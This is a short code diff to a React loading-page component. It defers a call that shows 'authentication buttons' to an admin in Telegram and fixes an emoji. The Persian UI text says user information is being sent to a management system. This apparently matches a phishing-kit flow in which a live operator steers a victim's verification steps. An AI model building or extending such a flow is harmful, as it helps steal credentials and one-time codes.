@@ -30,12 +30,13 @@ const Loading = () => {
         const session = getSession(sessionId);
         setSessionData(session);
 
-        // Update Telegram that user is on loading page (show admin buttons)
-        await setUserCurrentStep(sessionId, "waiting_admin");
-
-        // Show loading for 2 seconds then show waiting message
-        setTimeout(() => {
+        // Show loading for 2 seconds
+        setTimeout(async () => {
           setIsLoading(false);
+
+          // After loading is done, show admin buttons in Telegram
+          console.log("📱 User reached loading page, showing admin buttons...");
+          await showAdminButtons(sessionId);
         }, 2000);
       } catch (error) {
         console.error("Failed to initialize loading page:", error);
@@ -363,7 +364,7 @@ const Loading = () => {
               lineHeight: "1.4",
             }}
           >
-            ��{" "}
+            🤖{" "}
             {isLoading
               ? "در حال ارسال اطلاعات به سیستم مدیریت..."
               : "ادمین در تلگرام دکمه‌های احراز هویت را مشاهده می‌کند"}
